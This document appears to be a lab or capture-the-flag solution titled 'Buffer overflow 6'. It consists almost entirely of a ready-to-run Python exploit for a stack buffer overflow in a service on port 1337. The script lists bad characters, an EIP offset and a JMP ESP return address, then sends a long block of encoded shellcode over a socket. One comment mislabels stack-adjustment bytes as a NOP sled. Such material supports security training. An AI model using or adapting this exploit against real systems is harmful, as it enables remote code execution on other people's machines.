# Buffer overflow 6

Badchars: `\x00\x08\x2c\xad`

## Exploit code

```python
#!/usr/bin/env python3
import socket


ip = "MACHINE_IP"
port = 1337

buf_length = 1500
prefix = "OVERFLOW6 "
offset = 1034                           # EIP offset
overflow = "A" * 1034
jmp_esp = "\xf7\x11\x50\x62"

buffer = ""
buffer += prefix
buffer += overflow                      # Padding
buffer += jmp_esp                       # Overwrite saved return pointer
buffer += "\x83\xec\x10"                # NOP sled
buffer += ("\xbe\x4d\xe0\x87\x1b\xdb\xc7\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1" 
	"\x52\x83\xef\xfc\x31\x77\x0e\x03\x3a\xee\x65\xee\x38\x06\xeb"
	"\x11\xc0\xd7\x8c\x98\x25\xe6\x8c\xff\x2e\x59\x3d\x8b\x62\x56"
	"\xb6\xd9\x96\xed\xba\xf5\x99\x46\x70\x20\x94\x57\x29\x10\xb7"
	"\xdb\x30\x45\x17\xe5\xfa\x98\x56\x22\xe6\x51\x0a\xfb\x6c\xc7"
	"\xba\x88\x39\xd4\x31\xc2\xac\x5c\xa6\x93\xcf\x4d\x79\xaf\x89"
	"\x4d\x78\x7c\xa2\xc7\x62\x61\x8f\x9e\x19\x51\x7b\x21\xcb\xab"
	"\x84\x8e\x32\x04\x77\xce\x73\xa3\x68\xa5\x8d\xd7\x15\xbe\x4a"
	"\xa5\xc1\x4b\x48\x0d\x81\xec\xb4\xaf\x46\x6a\x3f\xa3\x23\xf8"
	"\x67\xa0\xb2\x2d\x1c\xdc\x3f\xd0\xf2\x54\x7b\xf7\xd6\x3d\xdf"
	"\x96\x4f\x98\x8e\xa7\x8f\x43\x6e\x02\xc4\x6e\x7b\x3f\x87\xe6"
	"\x48\x72\x37\xf7\xc6\x05\x44\xc5\x49\xbe\xc2\x65\x01\x18\x15"
	"\x89\x38\xdc\x89\x74\xc3\x1d\x80\xb2\x97\x4d\xba\x13\x98\x05"
	"\x3a\x9b\x4d\x89\x6a\x33\x3e\x6a\xda\xf3\xee\x02\x30\xfc\xd1"
	"\x33\x3b\xd6\x79\xd9\xc6\xb1\x45\xb6\xb8\xc1\x2e\xc5\x38\xc3"
	"\x15\x40\xde\xa9\x79\x05\x49\x46\xe3\x0c\x01\xf7\xec\x9a\x6c"
	"\x37\x66\x29\x91\xf6\x8f\x44\x81\x6f\x60\x13\xfb\x26\x7f\x89"
	"\x93\xa5\x12\x56\x63\xa3\x0e\xc1\x34\xe4\xe1\x18\xd0\x18\x5b"
	"\xb3\xc6\xe0\x3d\xfc\x42\x3f\xfe\x03\x4b\xb2\xba\x27\x5b\x0a"
	"\x42\x6c\x0f\xc2\x15\x3a\xf9\xa4\xcf\x8c\x53\x7f\xa3\x46\x33"
	"\x06\x8f\x58\x45\x07\xda\x2e\xa9\xb6\xb3\x76\xd6\x77\x54\x7f"
	"\xaf\x65\xc4\x80\x7a\x2e\xe4\x62\xae\x5b\x8d\x3a\x3b\xe6\xd0"
	"\xbc\x96\x25\xed\x3e\x12\xd6\x0a\x5e\x57\xd3\x57\xd8\x84\xa9"
	"\xc8\x8d\xaa\x1e\xe8\x87")
buffer += "D" * (buf_length - (len(buffer) - len(prefix)))      # Trail padding
buffer += "\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("[+] Sending evil buffer of {} bytes...".format((len(buffer) - len(prefix) - 2)))
    s.send(bytes(buffer, "latin-1"))
    print("[+] Done!")
except socket.error:
    print("[-] Could not connect.")
finally:
    s.close()

```

